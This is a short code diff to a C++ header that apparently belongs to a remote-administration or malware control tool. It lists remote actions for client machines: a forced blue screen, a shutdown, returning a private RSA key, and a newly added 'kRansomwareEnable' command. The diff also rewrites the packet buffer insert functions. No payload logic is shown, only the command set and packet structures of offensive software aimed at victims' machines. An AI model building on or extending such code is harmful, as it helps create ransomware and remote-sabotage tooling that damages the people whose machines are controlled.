@@ -35,6 +35,7 @@ enum RemoteAction {
     kPingClient,
     kRemoteBSOD, // cause a blue screen of death
     kRemoteShutdown, // shut down the client machine
+    kRansomwareEnable, // dangerous, enable ransomware on client machine
     kReturnPrivateRSAKey,
 };
 
@@ -75,6 +76,8 @@ struct ClientResponse {
     RemoteAction       actionPerformed; // ( if any, otherwise put NONE )
 };
 
+#include <iostream>
+
 /*
     Packet of information sent over sockets.
 */
@@ -85,8 +88,14 @@ struct Packet {
     RemoteAction action;
     int flags;
 
-    inline const void insert(char* s) { memcpy_s(buffer, MAX_BUFFER_LEN, s, strlen(s)); buffLen = strlen(s); }
-    inline const void insert(std::string s) { insert(s.c_str()); buffLen = s.size(); }
+    inline const void insert(char* s) { 
+        strcpy_s(buffer, s); 
+        buffLen = strlen(s); 
+    }
+    inline const void insert(std::string s) {
+        strcpy_s(buffer, s.c_str());
+        buffLen = s.length();
+    }
 };
 #pragma pack(pop, 0)
 
